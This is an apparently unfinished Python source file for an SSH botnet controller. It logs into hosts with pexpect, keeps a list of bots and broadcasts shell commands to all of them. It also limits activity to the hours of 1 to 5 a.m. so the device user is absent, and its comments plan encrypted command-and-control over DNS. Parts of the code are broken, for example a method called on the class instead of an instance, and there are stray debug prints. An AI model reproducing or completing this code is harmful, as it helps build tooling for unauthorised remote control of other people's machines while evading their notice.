from pexpect import pxssh
from datetime import datetime, time

# For modern techniques:
# https://www.researchgate.net/publication/336246015_Advanced_Information_Hiding_Techniques_for_Modern_Botnets#read
# For sending DNS covert data
# https://www.researchgate.net/publication/335854377_Encrypted_and_Covert_DNS_Queries_for_Botnets_Challenges_and_Countermeasures

# TODO: check UK holidays for now and execute them

class Bot:

    #initiate new client
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    def ssh(self):
        try:
            bot = pxssh.pxssh()
            print('4')
            bot.login(self.host,self.user,self.password)
            print('2')
            return bot
        except Exception as e:
            print(e)

    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        print('1')
        return self.session.before

class BotOps:

    def add_bot(host,user,password):
        new_bot = Bot(host,user,password)
        botnet.append(new_bot)

    def command_bots(command):
        for bot in botnet:
            print('3')
            attack = Bot.send_command(command)
            print('Output from ' + bot.host)
            print(attack)

    # encrypt C&C communications over DNS
    #def sendDNS():


class SecurityChecks:
    # https://stackoverflow.com/questions/10048249/how-do-i-determine-if-current-time-is-within-a-specified-range-using-pythons-da
    def isMidnight(inTime, endTime, check_time=None):
        check_time = check_time or datetime.utcnow().time()
        if inTime < endTime:
            return check_time >= inTime and check_time <= endTime
        else:
            return check_time >= inTime or check_time <= endTime

    # def checkHoliday()


botnet = []
holidaysUK = []

# be active only when user is not using device
if SecurityChecks.isMidnight(time(1,00), time(5,00)):
    BotOps.add_bot('172.17.0.2','','')
else:
    print("It's insecure to execute now")

#BotOps.command_bots('ls')
